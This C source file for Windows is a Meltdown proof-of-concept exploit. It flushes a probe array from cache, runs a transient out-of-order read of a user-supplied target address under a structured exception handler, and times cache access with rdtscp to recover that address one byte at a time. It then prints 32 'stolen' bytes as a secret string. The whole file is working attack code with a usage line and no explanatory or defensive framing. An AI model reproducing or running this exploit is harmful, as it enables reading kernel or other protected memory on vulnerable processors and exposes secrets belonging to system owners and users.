#include <stdio.h>
#include <intrin.h>
#include <excpt.h>
#include <stdint.h>
#include <locale.h>
#include <Windows.h>

uint8_t probe_array[256][4096];
uint64_t access_time[256];

void OutOfOrderExecution(void* target, void* probe_array, void* null);

uint8_t
Steal(uint8_t* target)
{
    for (size_t retries = 0; retries < 30000; retries++)
    {
        for (size_t i = 0; i < 256; i++)
        {
            _mm_clflush(&probe_array[i]);
            _mm_pause();
        }

        __try
        {
            OutOfOrderExecution(target, probe_array, NULL);
        }
        __except (EXCEPTION_EXECUTE_HANDLER) {}

        for (size_t i = 0; i < 256; i++)
        {
            uint32_t aux = 0;
            uint64_t a = __rdtscp(&aux);
            probe_array[i][0]++;
            uint64_t b = __rdtscp(&aux);
            access_time[i] = b - a;
        }

        size_t idx_min = 0;
        for (size_t i = 0; i < 256; i++)
        {
            if (access_time[i] < access_time[idx_min]) idx_min = i;
            _mm_pause();
        }

        if (access_time[idx_min] < 100 && idx_min != 0)
        {
            printf(" => %02X retries=%-5zd access_time=%llu\n"
                , (uint32_t)idx_min
                , retries
                , access_time[idx_min]
            );
            return (uint8_t)idx_min;
        }

        _mm_pause();
    }

    printf(" => 00\n");
    return 0;
}

int
main(int argc, char* argv[])
{
    if (argc < 2)
    {
        printf("USAGE: meltdown target\n");
        return 1;
    }

    uint8_t* target = NULL;
    if (sscanf_s(argv[1], "%p", &target) != 1)
    {
        printf("USAGE: meltdown target\n");
        return 1;
    }

    SetProcessAffinityMask(GetCurrentProcess(), 1);

    uint8_t buffer[32] = { 0 };

    for (size_t i = 0; i < sizeof(buffer); i++)
    {
        printf("Steal#%-2zd", i);
        buffer[i] = Steal(target + i);
    }

    for (size_t i = 0; i < sizeof(buffer); i++)
    {
        printf("%02X", (uint32_t)buffer[i]);
        printf((i + 1) % 16 == 0 || i + 1 == sizeof(buffer) ? "\n" : " ");
    }

    setlocale(LC_CTYPE, "");

    wchar_t* secret = (wchar_t*)buffer;
    for (size_t i = 0; i < sizeof(buffer) / sizeof(wchar_t); i++)
        putwchar(secret[i]);
    putchar('\n');
}
